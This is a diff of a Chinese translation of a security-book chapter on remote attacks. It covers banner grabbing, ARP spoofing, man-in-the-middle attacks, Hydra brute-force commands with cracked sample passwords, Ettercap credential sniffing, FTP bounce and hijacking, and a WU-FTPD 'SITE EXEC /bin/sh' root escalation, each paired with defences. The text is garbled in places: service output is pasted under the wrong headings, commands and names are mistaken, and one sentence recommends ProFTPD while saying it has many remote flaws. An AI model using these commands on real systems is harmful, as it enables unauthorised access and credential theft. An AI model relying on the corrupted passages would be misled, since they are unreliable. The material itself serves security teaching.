 如果你运行任何 RPC 服务，强烈建议采取以下措施：
 
 - 如果没有运行任何 RPC 服务，请禁用 Portmapper。
-- 通过注释掉 inetd.conf 中相应的行，来禁用 rpc.usersd 和 rpc.whod。如果使用 xinetd，请查看你的 xinetd d 目录，并确保要禁用的服务对应文件包含此行：
-  disable = yes
+- 通过注释掉 `inetd.conf` 中相应的行，来禁用 `rpc.usersd` 和 `rpc.whod`。如果使用 `xinetd`，请查看你的 `xinetd` d 目录，并确保要禁用的服务对应文件包含此行：
+  `disable = yes`
 - 禁用任何未使用的 RPC 服务。
 
-你必须重启 inetd 或 xinetd 更改才能生效。
+你必须重启 `inetd` 或 `xinetd` 更改才能生效。
 
 ### NNTP（网络新闻传输协议）：119 (TCP)
 
@@ -2308,7 +2557,9 @@ Connected to 192.168.1.1.
 ```
 
 转义字符为 '^'。
+
 200 192.168.1.1 InterNetNews NNTP server INN 1.4 22-Dec-93
+
 ready (posting ok).
 
 #### 修改 NNTP 服务器横幅
@@ -2333,11 +2584,9 @@ Domain=[REMOTEMAIN] OS=[Unix] Server=[Samba 2.2.8]
 | --- | --- | --- |
 | IPC$ | IPC | IPC 服务 (Samba 服务器) |
 | ADMIN$ | Disk | IPC 服务 (Samba 服务器) |
-
 | 服务器 | 注释 |
 | --- | --- |
-| RSAMBASERVER | |
-
+| RSAMBASERVER |  |
 | 工作组 | 主节点 |
 | --- | --- |
 | RGROUP | RMASTERHOST |
@@ -2346,8 +2595,8 @@ Domain=[REMOTEMAIN] OS=[Unix] Server=[Samba 2.2.8]
 
 可以采取以下步骤来加固 Samba 服务器配置：
 
-- 编辑 smb.conf 并修改
-  server string = Samba Server
+- 编辑 `smb.conf` 并修改
+  `server string = Samba Server`
   改为新的字符串。
   一旦你编辑了源代码以反映新的横幅信息，请重新编译并安装 Samba 服务器。
 
@@ -2367,7 +2616,9 @@ Connected to 192.168.1.1.
 ```
 
 转义字符为 '^'。
+
 200 192.168.1.1 InterNetNews NNTP server INN 1.4 22-Dec-93
+
 ready (posting ok).
 
 #### 修改 IMAP 服务器横幅
@@ -2402,10 +2653,6 @@ SNMP 是一种用于管理网络设备的协议。
 [bash]$ telnet 192.168.1.1 119
 ```
 
-
-
-
-
 * OK [CAPABILITY4 IMAP4REV1 LOGIN-REFERRALS AUTH=LOGIN localhost IMAP4rev1 2000.283 at Thu, 16 Jan 2003 03:51:56 -0500 (EST)]
 
 OpenSSL 可以在 http://www.openssl.org 获取。
@@ -2420,7 +2667,7 @@ POP3S 是基于 SSL（安全套接层）的 POP3。POP3 使用 SSL 来建立并�
 
 #### 获取 POP3S 服务器 Banner
 
-使用命令行工具 openssl 连接到 POP3S 服务器以获取横幅页（banner）信息：
+使用命令行工具 `openssl` 连接到 POP3S 服务器以获取横幅页（banner）信息：
 
 ```bash
 [bash]$ openssl s_client -connect:192.168.1.1:995
@@ -2445,7 +2692,7 @@ MySQL 是一个流行的开源数据库软件包。它可以在 http://www.mysql
 
 ## 列举 MySQL 版本信息
 
-可以通过 telnet 客户端连接到其端口，获取远程 MySQL 服务器的版本号：
+可以通过 `telnet` 客户端连接到其端口，获取远程 MySQL 服务器的版本号：
 
 ```bash
 [bash]$ telnet 10.0.0.1 3306
@@ -2456,6 +2703,7 @@ MySQL 是一个流行的开源数据库软件包。它可以在 http://www.mysql
 ## 第一部分：黑客技术与防御
 
 已连接到 127.0.0.1。
+
 转义字符为 '^'。
 
 ```
@@ -2471,9 +2719,11 @@ MySQL 是一个流行的开源数据库软件包。它可以在 http://www.mysql
 
 ## 自动获取 Banner
 
-Netcat 是一个使用 TCP 或 UDP 跨网络连接进行读写数据的工具。它可以像命令行 telnet 客户端一样连接到服务器。
+Netcat 是一个使用 TCP 或 UDP 跨网络连接进行读写数据的工具。它可以像命令行 `telnet` 客户端一样连接到服务器。
 
 可以使用以下方法使用 Netcat 获取 SMTP Banner：
+
+
 
 ```bash
 [bash]$ nc 192.168.1.1 25
@@ -2481,7 +2731,7 @@ Netcat 是一个使用 TCP 或 UDP 跨网络连接进行读写数据的工具。
 14 Jan 2003 09:28:02 -0500 (EST)
 ```
 
-通过 Shell 编程，你可以使用 Netcat 执行自动化的 Banner 获取。例如，考虑以下脚本（我们称其为 grab.bash）：
+通过 Shell 编程，你可以使用 Netcat 执行自动化的 Banner 获取。例如，考虑以下脚本（我们称其为 `grab.bash`）：
 
 ```bash
 #!/bin/bash
@@ -2505,7 +2755,7 @@ do
   echo
 ```
 
-该脚本包含一个针对变量 `i` 从 21 到 25 的 while 循环。在 while 循环内部，会对主机（传递给脚本的第一个参数，即 $1）建立值为 `i`（21 到 25）的连接，并将 `/dev/null` 作为输入传递给 Netcat 连接。由于 `/dev/null` 是一个为空的特殊文件，Netcat 在获取 Banner 的第一行（如果有）后将立即终止。
+该脚本包含一个针对变量 `i` 从 21 到 25 的 `while` 循环。在 `while` 循环内部，会对主机（传递给脚本的第一个参数，即 `$1`）建立值为 `i`（21 到 25）的连接，并将 `/dev/null` 作为输入传递给 Netcat 连接。由于 `/dev/null` 是一个为空的特殊文件，Netcat 在获取 Banner 的第一行（如果有）后将立即终止。
 
 在尝试执行上述脚本之前，通过以下命令赋予权限：
 
@@ -2532,7 +2782,7 @@ SSH-1.99-OpenSSH_3.4pl
 14:13:10 -0500 (EST)
 ```
 
-如果需要在多个主机上执行上述脚本，你可以像这样编写一个针对 grab.bash 脚本的封装脚本：
+如果需要在多个主机上执行上述脚本，你可以像这样编写一个针对 `grab.bash` 脚本的封装脚本：
 
 ```bash
 #!/bin/bash
@@ -2542,7 +2792,7 @@ do
   echo
 ```
 
-上述脚本（可以称为 wrapper-grab.bash）将对 hosts.txt 文件中列出的主机执行原始脚本 grab.bash。hosts.txt 文件必须包含目标主机的主机或 IP 地址，如下：
+上述脚本（可以称为 `wrapper-grab.bash`）将对 `hosts.txt` 文件中列出的主机执行原始脚本 `grab.bash`。`hosts.txt` 文件必须包含目标主机的主机或 IP 地址，如下：
 
 ```
 192.168.1.1
@@ -2556,118 +2806,123 @@ somecompanyasanexample.com
 where getrequest.txt
 ```
 
-
-
-
 # 60 第一部分：攻击技术与防御
 
 这些用于在交换机上对流量进行代理。考虑存在于网络交换机上的以下主机：
 
--   受害者主机
--   网关主机
--   恶意主机
+- 受害者主机
+- 网关主机
+- 恶意主机
 
-为了执行 ARP 欺骗，主机 M 将向主机 G 和主机 V 发送 ARP 响应数据包。这些 ARP 响应数据包将导致主机 V 将主机 M 的 MAC 地址映射到主机 G 的 IP 地址上，并导致 G 将 M 的 MAC 地址映射到主机 V 的 IP 地址上。由于以太网数据包是根据 MAC 地址进行路由的，主机 M 将接收到所有在 G 和 V 之间传输的数据。现在，如果 M 通过将 MAC 地址替换为主机 G 或 V 的 MAC 地址并将这些数据包路由到正确的目的地，受害者主机 G 和 V 将完全不知道它们的连接正被主机 M 探测。可以使用 Dsniff 和 Ettercap 等工具执行 ARP 欺骗。
-Ettercap 可以在 http://ettcap.sourceforge.net/ 下载。Dsniff 可以在 http://monkey.org/dugsong/dsniff 获取。
+为了执行 ARP 欺骗，主机 M 将向主机 G 和主机 V 发送 ARP 响应数据包。这些 ARP 响应数据包将导致主机 V 将主机 M 的 MAC 地址映射到主机 G 的 IP 地址上，并导致 G 将 M 的 MAC 地址映射到主机 V 的 IP 地址上。由于以太网数据包是根据 MAC 地址进行路由的，主机 M 将接收到所有在 G 和 V 之间传输的数据。现在，如果 M 通过将 MAC 地址替换为主机 G 或 V 的 MAC 地址并将这些数据包路由到正确的目的地，受害者主机 G 和 V 将完全不知道它们的连接正被主机 M 探测。可以使用 `Dsniff` 和 `Ettercap` 等工具执行 ARP 欺骗。
 
-# 常见的嗅探防御措施
+`Ettercap` 可以在 `http://ettcap.sourceforge.net/` 下载。`Dsniff` 可以在 `http://monkey.org/dugsong/dsniff` 获取。
+
+## 常见的嗅探防御措施
 
 网络嗅探工具使得恶意用户很容易捕获网络分段上的数据。强烈建议采取以下防御措施：
 
--   不要使用明文协议。
--   某些交换机允许管理员静态映射 MAC 地址。然而，这对于大型企业来说可能不可行。
--   许多入侵检测系统（IDS）可以检测并报告 ARP 欺骗。可以使用 Ettercap 帮助检测网络上的 ARP 响应。
+- 不要使用明文协议。
+- 某些交换机允许管理员静态映射 MAC 地址。然而，这对于大型企业来说可能不可行。
+- 许多入侵检测系统（IDS）可以检测并报告 ARP 欺骗。可以使用 `Ettercap` 帮助检测网络上的 ARP 响应。
 
-# 中间人
+## 中间人
 
 此类攻击涉及恶意用户拦截并更改两个或多个受害者主机之间的数据。
 
-例如，注意，由于他已成功破解了 somecompanyasanexample.com 的内部 DNS 服务器，该入侵者可能会更改 DNS 服务器配置，使所有针对 `intranet.somecompanyasanexample.com` 的 DNS 查询都指向入侵者的 IP 地址。这将导致用户在不知情的情况下连接到入侵者的主机，而不是 `intranet.somecompanyasanexample.com`。入侵者随后可以将受害者的连接代理到 `intranet.somecompanyasanexample.com` 的真实 IP 地址。在这种情况下，入侵者将成功发起了一次中间人攻击。
+例如，注意，由于他已成功破解了 `somecompanyasanexample.com` 的内部 DNS 服务器，该入侵者可能会更改 DNS 服务器配置，使所有针对 `intranet.somecompanyasanexample.com` 的 DNS 查询都指向入侵者的 IP 地址。这将导致用户在不知情的情况下连接到入侵者的主机，而不是 `intranet.somecompanyasanexample.com`。入侵者随后可以将受害者的连接代理到 `intranet.somecompanyasanexample.com` 的真实 IP 地址。在这种情况下，入侵者将成功发起了一次中间人攻击。
 
-# 防止中间人攻击
+## 防止中间人攻击
 
-使用 SSH、IMAPS 和 HTTPS 等安全协议。虽然这些协议可能受到中间人攻击的影响，但它们可能利用加密密钥和证书，从而让软件客户端警告终端用户可能发生的攻击。
+使用 `SSH`、`IMAPS` 和 `HTTPS` 等安全协议。虽然这些协议可能受到中间人攻击的影响，但它们可能利用加密密钥和证书，从而让软件客户端警告终端用户可能发生的攻击。
 
-# 配置错误
+## 配置错误
 
 通常，服务的配置错误会导致向未经验身份的用户暴露不必要的信息。有时，配置错误可能会导致主机被完全攻陷。常见的配置错误及其防御措施列在下面的“远程服务漏洞”章节。
 
-# 审计并加固主机配置
+## 审计并加固主机配置
 
 定期审计和加固主机配置策略是一个好主意。请参阅本书第二部分的章节，了解如何加固策略和服务的。
 
-# 软件漏洞
+## 软件漏洞
 
 软件漏洞是由设计缺陷引起的，例如不当的输入验证和边界检查。此类漏洞通常可以远程利用，允许攻击者在运行漏洞软件的主机上执行恶意代码。
 
-缓冲区溢出是许多可远程利用条件的原因。当进程向内存中写入超过分配的缓冲区空间的数据时，就会发生这种情况。这会导致可执行栈空间被任意数据覆盖。攻击者可以利用这种条件通过提供自己的输入，可能导致进程用攻击者提供的可执行数据覆盖其栈。如需更多信息和细节，请参阅“Aleh One”的《Smashing the Stack for Fun and Profit》，该文档位于 http://www.insecure.org/stf/smashstack.txt。
+缓冲区溢出是许多可远程利用条件的原因。当进程向内存中写入超过分配的缓冲区空间的数据时，就会发生这种情况。这会导致可执行栈空间被任意数据覆盖。攻击者可以利用这种条件通过提供自己的输入，可能导致进程用攻击者提供的可执行数据覆盖其栈。如需更多信息和细节，请参阅“Aleh One”的《Smashing the Stack for Fun and Profit》，该文档位于 `http://www.insecure.org/stf/smashstack.txt`。
 
 # 62 第一部分：攻击技术与防御
 
-许多在线安全资源发布针对各种漏洞的利用代码。请对此类利用程序保持谨慎，因为它们可能各异，并且已知包含恶意后门，可能导致执行利用程序的主机被攻陷。在虚拟机环境下测试未知的利用程序是一个好主意。最广泛使用的虚拟机软件由 VMware 提供。详情请参阅 http://www.vmware.com/。
+许多在线安全资源发布针对各种漏洞的利用代码。请对此类利用程序保持谨慎，因为它们可能各异，并且已知包含恶意后门，可能导致执行利用程序的主机被攻陷。在虚拟机环境下测试未知的利用程序是一个好主意。最广泛使用的虚拟机软件由 `VMware` 提供。详情请参阅 `http://www.vmware.com/`。
 
-# 针对软件漏洞利用的常见防御
+## 针对软件漏洞利用的常见防御
 
 有时，软件漏洞的远程利用会通过漏洞公告提供，或者发布补丁。此类利用程序通常被称为零日漏洞。防御针对未公布漏洞的利用是不可能的。但除了遵循这些建议外，每位系统管理员必须监控并对异常的系统活动采取行动：
 
--   保持软件补丁为最新。
--   订阅漏洞监控列表，例如 Bugtraq。（更多信息请访问 http://securityfocus.com/cgi-bin/sfonline/subscribe.pl。）参阅本书参考中心中的“在线资源”部分以获取许多其他安全资源的索引。
--   为了防止某些类型的缓冲区溢出，有几种解决方案：
-     StackGuard: http://www.immunix.org/stackguard.html
-  -   Libsafe: http://www.research.avalabs.com/project/libsafe/
-  -   StackGhost: http://stackghost.pierdas.stanford.edu/
-  -   Openwall: http://www.openwall.com/linux
+- 保持软件补丁为最新。
+- 订阅漏洞监控列表，例如 `Bugtraq`。（更多信息请访问 `http://securityfocus.com/cgi-bin/sfonline/subscribe.pl`。）参阅本书参考中心中的“在线资源”部分以获取许多其他安全资源的索引。
+- 为了防止某些类型的缓冲区溢出，有几种解决方案：
 
-如果使用 Solaris，编辑 /etc/system 并添加以下行：
+  `StackGuard`: `http://www.immunix.org/stackguard.html`
+
+  - `Libsafe`: `http://www.research.avalabs.com/project/libsafe/`
+  - `StackGhost`: `http://stackghost.pierdas.stanford.edu/`
+  - `Openwall`: `http://www.openwall.com/linux`
+
+如果使用 Solaris，编辑 `/etc/system` 并添加以下行：
 
 ```
 set noexec_user_stack=1
 set noexec_usr_stack_log=1
 ```
 
--   监控并响应 IDS 日志。
+- 监控并响应 IDS 日志。
 
-# 远程服务漏洞
+## 远程服务漏洞
 
 以下是常用利用的服务列表。它是基于服务已知通常监听的标准端口号。
 
-# 识别在非标准端口运行的服务
+## 识别在非标准端口运行的服务
 
-此处列出的任何服务都可以配置为在非标准端口上监听。可以使用 Amap（可在 http://www.thehackers.com 获取）等工具来识别非标准端口上的服务。
+此处列出的任何服务都可以配置为在非标准端口上监听。可以使用 `Amap`（可在 `http://www.thehackers.com` 获取）等工具来识别非标准端口上的服务。
+
+
 
 ### 关闭不必要的服务
 
-某些服务被配置为接受任何源的连接。例如，一个 HTTP 服务器允许所有用户查看组织的网站。在这种情况下，无法隐藏组织正在运行 HTTP 服务器的事实。
+某些服务被配置为接受任何源的连接。例如，一个 `HTTP` 服务器允许所有用户查看组织的网站。在这种情况下，无法隐藏组织正在运行 `HTTP` 服务器的事实。
 
-然而，根据组织的需求和网络架构，某些服务可能只期望授权 IP 地址的连接。在这种情况下，应建立防火墙规则阻止来自未经授权 IP 地址的连接。此外，必须通过防火墙关闭不必要的服务。
+然而，根据组织的需求和网络架构，某些服务可能只期望授权 `IP` 地址的连接。在这种情况下，应建立防火墙规则阻止来自未经授权 `IP` 地址的连接。此外，必须通过防火墙关闭不必要的服务。
 
 ### FTP（文件传输协议）：21 (TCP)
 
-FTP 是一种从一个主机到另一个主机传输文件的协议。
+`FTP` 是一种从一个主机到另一个主机传输文件的协议。
 
-可以使用 Hydra 暴力破解 FTP 账户。
+可以使用 `Hydra` 暴力破解 `FTP` 账户。
 
-# 暴力破解 FTP
+#### 暴力破解 FTP
 
-以下是使用 Hydra 暴力破解账户的示例：
+以下是使用 `Hydra` 暴力破解账户的示例：
 
 ```
 [bash]$ hydra -L usernames.txt -P passwords.txt
 ftp.companyexample.com ftp
 ```
 
-Hydra v2.0 (c) 2002) Hauser / THC - 仅允许合法用途。
-Hydra 正在启动！[并行任务：4, 登录尝试：4 (1:2/p)]
+`Hydra` v2.0 (c) 2002) Hauser / THC - 仅允许合法用途。
+
+`Hydra` 正在启动！[并行任务：4, 登录尝试：4 (1:2/p)]
+
 [21][ftp] login: joe password: mypassword
-Hydra 结束。
 
-# 防止 FTP 暴力破解
+`Hydra` 结束。
 
-请参见“针对暴力破解的常见防御”。由于 FTP 是一种明文协议，可以捕获在网络上传输的用户名和密码。Etter 等工具有助于获取 FTP 数据。
+#### 防止 FTP 暴力破解
 
-# 嗅探 FTP 身份验证
+请参见“针对暴力破解的常见防御”。由于 `FTP` 是一种明文协议，可以捕获在网络上传输的用户名和密码。`Etter` 等工具有助于获取 `FTP` 数据。
 
-以下是使用 Ettercap 捕获网络上传输的 FTP 凭据的示例：
+#### 嗅探 FTP 身份验证
+
+以下是使用 `Ettercap` 捕获网络上传输的 `FTP` 凭据的示例：
 
 ```
 [bash]# ettercap -m -C -N
@@ -2693,10 +2948,6 @@ TCP + UDP 数据包... (默认)
 收集密码...
 ```
 
-
-
-
-
 # 第 4 章：远程攻击
 
 07:04:58 10.0.0.102:4814 --> 192.168.1.121 ftp
@@ -2706,118 +2957,126 @@ USER: smith
 PASS: myp455w0rd
 ```
 
-# 使用安全协议
+#### 使用安全协议
 
-不要使用如 FTP 等类的明文协议。考虑使用 HTTPS 或 SSH 来执行安全文件传输。
+不要使用如 `FTP` 等类的明文协议。考虑使用 `HTTPS` 或 `SSH` 来执行安全文件传输。
 
-FTP 配置错误：FTP 客户端和服务器容易受到远程利用漏洞的影响。接下来的章节将介绍针对此类配置错误常见的攻击方式。
+`FTP` 配置错误：`FTP` 客户端和服务器容易受到远程利用漏洞的影响。接下来的章节将介绍针对此类配置错误常见的攻击方式。
 
-# 弹回攻击 (Bounce Attacks)
+#### 弹回攻击 (Bounce Attacks)
 
-由于 FTP 协议的设计，当 FTP 客户端使用“主动”（active）模式请求数据传输时，FTP 服务器必须向向 FTP 客户端上的某个端口发起连接。FTP 客户端使用 `PORT` 命令，并将其 IP 地址和列表编号作为参数。如果 FTP 客户端发送带有另一个主机 IP 地址的 `PORT` 命令，FTP 服务器将尝试连接到该主机。因此，FTP 协议的这一特性可以用于代理扫描。你可以利用 nmap 的 `-b` 选项来执行此类扫描。
+由于 `FTP` 协议的设计，当 `FTP` 客户端使用“主动”（active）模式请求数据传输时，`FTP` 服务器必须向向 `FTP` 客户端上的某个端口发起连接。`FTP` 客户端使用 `PORT` 命令，并将其 `IP` 地址和列表编号作为参数。如果 `FTP` 客户端发送带有另一个主机 `IP` 地址的 `PORT` 命令，`FTP` 服务器将尝试连接到该主机。因此，`FTP` 协议的这一特性可以用于代理扫描。你可以利用 `nmap` 的 `-b` 选项来执行此类扫描。
 
-一旦发送了 `PORT` 命令，恶意客户端就可以执行 `RET` 命令，向 FTP 服务器发送包含命令的文件。这将导致 FTP 服务器将指定文件的内容转储到 `PORT` 命令所指定主机的特定端口。例如，该文件可能包含 SMTP 命令，从而允许恶意 FTP 客户端向 FTP 服务器代理发送电子邮件。
+一旦发送了 `PORT` 命令，恶意客户端就可以执行 `RET` 命令，向 `FTP` 服务器发送包含命令的文件。这将导致 `FTP` 服务器将指定文件的内容转储到 `PORT` 命令所指定主机的特定端口。例如，该文件可能包含 `SMTP` 命令，从而允许恶意 `FTP` 客户端向 `FTP` 服务器代理发送电子邮件。
 
-# 预防弹回攻击的成功
+#### 预防弹回攻击的成功
 
-请确保采取了以下预防措施以防止 FTP 弹回攻击：
+请确保采取了以下预防措施以防止 `FTP` 弹回攻击：
 
-- 配置你的 FTP 服务器，使其在下发 `PORT` 命令时，拒绝与除客户端以外的任何 IP 地址建立连接。大多数较新的 FTP 服务器默认都已开启了此功能。
+- 配置你的 `FTP` 服务器，使其在下发 `PORT` 命令时，拒绝与除客户端以外的任何 `IP` 地址建立连接。大多数较新的 `FTP` 服务器默认都已开启了此功能。
 - 指令你的防火墙不允许源端口为 20 的入站连接。但请注意，该规则可能会拦截合法连接。
 
-# 第一部分：攻击技术与防御
+### 第一部分：攻击技术与防御
 
-# 连接劫取
+#### 连接劫取
 
-当 FTP 客户端在 `PORT` 命令后发送 `PASV`（被动）命令并带有其 IP 地址和端口号时，服务器开始在请求的端口监听连接。此时，恶意用户可以在客户端之前连接到服务器的端口。取决于 FTP 客户端随后发送的命令，恶意用户现在可能获得传输数据的访问。
+当 `FTP` 客户端在 `PORT` 命令后发送 `PASV`（被动）命令并带有其 `IP` 地址和端口号时，服务器开始在请求的端口监听连接。此时，恶意用户可以在客户端之前连接到服务器的端口。取决于 `FTP` 客户端随后发送的命令，恶意用户现在可能获得传输数据的访问。
 
-如果不使用被动模式，则 FTP 会话将转用“主动”模式。在这种模式下，由客户端开始在指定端口监听。此时，攻击者可能会在 FTP 服务器之前连接到客户端。取决于客户端随后发送的命令，攻击者可能会伪装成合法服务器，并向客户端传输文件或数据。
+如果不使用被动模式，则 `FTP` 会话将转用“主动”模式。在这种模式下，由客户端开始在指定端口监听。此时，攻击者可能会在 `FTP` 服务器之前连接到客户端。取决于客户端随后发送的命令，攻击者可能会伪装成合法服务器，并向客户端传输文件或数据。
 
-# 预防连接劫持攻击
+#### 预防连接劫持攻击
 
 以下建议将有助于防范连接劫持攻击：
 
-- 配置你的 FTP 服务器，仅允许来自已验证客户端 IP 地址到其数据端口的连接。大多数 FTP 服务器默认都已开启了此功能。请注意，这可能无法防止攻击者和合法 FTP 用户处于同一个 NAT 网关背后的攻击，因为它们的源 IP 地址将是相同的。
-- 配置你的 FTP 客户端，使其仅接受来自其当前已连接的 FTP 服务器的连接。
+- 配置你的 `FTP` 服务器，仅允许来自已验证客户端 `IP` 地址到其数据端口的连接。大多数 `FTP` 服务器默认都已开启了此功能。请注意，这可能无法防止攻击者和合法 `FTP` 用户处于同一个 `NAT` 网关背后的攻击，因为它们的源 `IP` 地址将是相同的。
+- 配置你的 `FTP` 客户端，使其仅接受来自其当前已连接的 `FTP` 服务器的连接。
 
-软件漏洞：WU-FTPD 是 Unix 和 Linux 上最常用的 FTP 守护进程。遗憾的是，它的历史一直受到漏洞的困扰，已知存在许多远程利用漏洞。以下是一些已知的 WU-FTPD 漏洞的列表：
+软件漏洞：`WU-FTPD` 是 Unix 和 Linux 上最常用的 `FTP` 守护进程。遗憾的是，它的历史一直受到漏洞的困扰，已知存在许多远程利用漏洞。以下是一些已知的 `WU-FTPD` 漏洞的列表：
 
-字体 文件通配（File Globbing）堆溢损坏漏洞：WU-FTPD 的“文件通配”功能允许客户端按模式组织文件。发现某些模式会导致 WU-FTPD 进程中的堆损坏。该漏洞使得攻击者可以通过发送特殊构造的数据作为输入，在受漏洞的 WU-FTPD 服务器上执行任意命令。更多细节请参见 http://online.securityfocus.com/bid/3581
-- SITE EXEC 漏洞：旧版本的 WU-FTPD 在其“SITE EXEC”功能中存在漏洞。该漏洞允许客户端逃脱其允许执行的受限命令集。例如，如果 FTP 客户端执行了以下命令：
+字体 文件通配（File Globbing）堆溢损坏漏洞：`WU-FTPD` 的“文件通配”功能允许客户端按模式组织文件。发现某些模式会导致 `WU-FTPD` 进程中的堆损坏。该漏洞使得攻击者可以通过发送特殊构造的数据作为输入，在受漏洞的 `WU-FTPD` 服务器上执行任意命令。更多细节请参见 http://online.securityfocus.com/bid/3581
+
+- `SITE EXEC` 漏洞：旧版本的 `WU-FTPD` 在其“`SITE EXEC`”功能中存在漏洞。该漏洞允许客户端逃脱其允许执行的受限命令集。例如，如果 `FTP` 客户端执行了以下命令：
+
 ```
 SITE EXEC /bin/sh
 ```
+
 将获得 root 权限。
-- 路径溢出漏洞：WU-FTPD 在处理长路径名时存在缓冲区溢出漏洞。具体来说，这是由于 `strcpy()` 函数引起的。更多信息请参见 http://online.securityfocus.com/bid/2241
-- 长路径溢出漏洞：WU-FTPD 存在缓冲区溢出漏洞，由于 `strcpy()` 函数在从一个内存位置复制字符串到另一个位置时未进行边界检查，可能导致缓冲区溢出。请参见 http://www.securityfocus.com/Products/Retina/63.html 详情。
 
-考虑 ProFTPD 替代 WU-FTPD。ProFTPD 受到许多远程漏洞的影响。ProFTPD 可从 http://proftd.linux.org 获取。
+- 路径溢出漏洞：`WU-FTPD` 在处理长路径名时存在缓冲区溢出漏洞。具体来说，这是由于 `strcpy()` 函数引起的。更多信息请参见 http://online.securityfocus.com/bid/2241
+- 长路径溢出漏洞：`WU-FTPD` 存在缓冲区溢出漏洞，由于 `strcpy()` 函数在从一个内存位置复制字符串到另一个位置时未进行边界检查，可能导致缓冲区溢出。请参见 http://www.securityfocus.com/Products/Retina/63.html 详情。
 
-# SSH (Secure Shell)：22
+考虑 `ProFTPD` 替代 `WU-FTPD`。`ProFTPD` 受到许多远程漏洞的影响。`ProFTPD` 可从 http://proftd.linux.org 获取。
 
-SSH 是一种用于交换数据的安全协议。它可以用于登录远程机器、执行命令和传输文件。由于 SSH 内通信是加密的，它是 telnet、rlogin 和 FTP 的可靠替代方案。
+### SSH (Secure Shell)：22
 
-暴力破解 SSH 支持使用用户名和密码对进行身份验证。因此，可以对 SSH 进行暴力破解。
+`SSH` 是一种用于交换数据的安全协议。它可以用于登录远程机器、执行命令和传输文件。由于 `SSH` 内通信是加密的，它是 `telnet`、`rlogin` 和 `FTP` 的可靠替代方案。
 
-# SSH 暴力破解
+暴力破解 `SSH` 支持使用用户名和密码对进行身份验证。因此，可以对 `SSH` 进行暴力破解。
 
-可以使用 `expect` 工具编写简单的暴力破解脚本来对 SSH 进行暴力破解。一个 Expect 示例可以在 http://www.securiteam.com/tools/5Q2K6E.html 获取。程序可以从 http://expect.gov 下载。
+#### SSH 暴力破解
 
-# 防止 SSH 暴力破解
+可以使用 `expect` 工具编写简单的暴力破解脚本来对 `SSH` 进行暴力破解。一个 `Expect` 示例可以在 http://www.securiteam.com/tools/5Q2K6E.html 获取。程序可以从 http://expect.gov 下载。
+
+#### 防止 SSH 暴力破解
 
 请参见“暴力破解攻击的常见防御”。
 
-# SSH 中间人攻击
+#### SSH 中间人攻击
 
-SSH 容易受到同网段恶意用户的中间人攻击。
+`SSH` 容易受到同网段恶意用户的中间人攻击。
 
-# Sshmitm 和 Ettercap
+#### Sshmitm 和 Ettercap
 
-sshmitm 和 Ettercap 等工具可以代理 SSH 连接，而像 dnsspoof 这样的工具可以伪造 DNS 查询响应，从而将受害者的 SSH 客户端重定向到代理服务器。然而，受害者的 SSH 客户端可能会警告用户主机密钥发生了变化，因为呈现的主机密钥是攻击者代理服务器的密钥。遗憾的是，大多数用户并不重视这一警告，导致攻击成功。
+`sshmitm` 和 `Ettercap` 等工具可以代理 `SSH` 连接，而像 `dnsspoof` 这样的工具可以伪造 `DNS` 查询响应，从而将受害者的 `SSH` 客户端重定向到代理服务器。然而，受害者的 `SSH` 客户端可能会警告用户主机密钥发生了变化，因为呈现的主机密钥是攻击者代理服务器的密钥。遗憾的是，大多数用户并不重视这一警告，导致攻击成功。
 
-# 防止针对 SSH 的中间人攻击
+#### 防止针对 SSH 的中间人攻击
 
-教育用户不要接受远程 SSH 服务器的未知主机密钥。如果可能，在内部资源上列出这些密钥的指纹，以便用户在接受 SSH 会话之前进行验证。
+教育用户不要接受远程 `SSH` 服务器的未知主机密钥。如果可能，在内部资源上列出这些密钥的指纹，以便用户在接受 `SSH` 会话之前进行验证。
 
-软件漏洞：已知多个版本的 SSH 软件存在漏洞。下记录了最近的一个。
+软件漏洞：已知多个版本的 `SSH` 软件存在漏洞。下记录了最近的一个。
 
-Open SSH 挑战响应缓冲区溢出：发现多个 OpenSSH 实现由于其挑战响应机制受到缓冲区溢出攻击的影响。缓冲区溢出发生在编译为支持 SKEY 或 BSD_AUTH 认证的 OpenSSH 服务器上。
+`Open SSH` 挑战响应缓冲区溢出：发现多个 `OpenSSH` 实现由于其挑战响应机制受到缓冲区溢出攻击的影响。缓冲区溢出发生在编译为支持 `SKEY` 或 `BSD_AUTH` 认证的 `OpenSSH` 服务器上。
 
-此外，在 OpenSSH 的挑战响应机制中发现了另一个漏洞。该漏洞是由 OpenSSH 对挑战响应认证期间收到的响应处理不当引起的。支持交互式键盘认证的 PAM 模块的系统受到此漏洞的影响。因此，开启以下选项的系统受到影响：
+此外，在 `OpenSSH` 的挑战响应机制中发现了另一个漏洞。该漏洞是由 `OpenSSH` 对挑战响应认证期间收到的响应处理不当引起的。支持交互式键盘认证的 `PAM` 模块的系统受到此漏洞的影响。因此，开启以下选项的系统受到影响：
+
 ```
 PAMAuthenticationViaKbdIntChallengeResponse
 ```
+
 更多信息参见 http://online.securityfocus.com/bid/5093
 
 ### Telnet：23 (TCP)
 
+
+
 Telnet 是一种用于登录远程机器的明文协议。
 
-暴力破解：可以使用 Hydra 等许多可用工具对 FTP 账户进行暴力破解。
-
-
-
-
+暴力破解：可以使用 `Hydra` 等许多可用工具对 `FTP` 账户进行暴力破解。
 
 # Telnet 暴力破解
 
-可以使用 Hydra 对 telnet 进行暴力破解：
+可以使用 `Hydra` 对 `telnet` 进行暴力破解：
+
 ```bash
 hydra -L usernames.txt -P passwords.txt telnet
 ```
-Hydra v2.2 (c) 2002 由 Hauser / THC 开发 - 仅允许用于合法目的。
-Hydra 正在启动！ [并行任务: 4, 登录尝试: 9 (1:3/p3)] [23][telnet] login: jill password: i10v3jack
-Hydra 运行结束。
+
+`Hydra` v2.2 (c) 2002 由 Hauser / THC 开发 - 仅允许用于合法目的。
+
+`Hydra` 正在启动！ [并行任务: 4, 登录尝试: 9 (1:3/p3)] [23][telnet] login: jill password: i10v3jack
+
+`Hydra` 运行结束。
 
 # 防止 Telnet 暴力破解
 
 请参阅“暴力破解攻击的常见防御”。
 
-TCP 劫持：在 telnet 用户成功登录后，同一网段内的另一个用户可能可以使用 Huntcap 等 TCP 劫持工具劫持会话。
+`TCP` 劫持：在 `telnet` 用户成功登录后，同一网段内的另一个用户可能可以使用 `Huntcap` 等 `TCP` 劫持工具劫持会话。
 
 # 劫持 Telnet 会话
 
-假设 IP 地址为 192.168.1.1 的主机上的恶意用户与 192.168.1.2 处于同一网段。如果 192.168.1.2 上的用户建立了到 10.0.0.1 的 telnet 连接，那么 192.168.1.1 上的恶意用户可以使用 Huntcap 劫持它：
